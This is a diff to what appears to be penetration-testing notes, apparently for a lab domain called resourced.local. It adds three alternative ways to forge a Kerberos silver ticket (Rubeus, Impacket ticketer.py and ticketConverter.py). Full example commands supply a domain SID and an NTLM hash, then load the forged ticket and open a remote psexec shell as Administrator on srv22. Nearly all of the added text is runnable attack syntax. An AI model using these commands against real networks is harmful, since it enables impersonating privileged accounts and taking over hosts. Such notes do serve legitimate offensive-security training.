@@ -57,3 +57,40 @@ klist
 dir \\srv22.resourced.local\C$
 ```
 
+### Method 2: Rubeus (Windows - Alternative)
+#### Syntax:
+```powershell
+Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER> /ptt
+
+# Example:
+Rubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:srv22.resourced.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt
+```
+
+### Method 3: Impacket `ticketer.py` (Linux)
+#### Syntax:
+```bash
+ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn <SERVICE>/<TARGET_HOST> <USER>
+
+# Generate the ticket cache file
+ticketer.py -domain resourced.local -domain-sid S-1-5-21-3623811015-3361044348-30300820 -nthash 19a3a7550ce8c505c2d46b5e39d6f808 -spn cifs/srv22.resourced.local Administrator
+
+# Set the environment variable to use the ticket
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+
+# Authenticate using Kerberos authentication without a password
+impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
+```
+
+### Method 4: Impacket `ticketConverter.py` (Linux - Convert Tickets)
+```bash
+If you already possess a .kirbi file extracted from a Windows environment, it can be converted for Linux compatibility:
+
+# Convert .kirbi to .ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# Load and execute via Kerberos
+export KRB5CCNAME=$(pwd)/ticket.ccache
+impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
+```
+
+
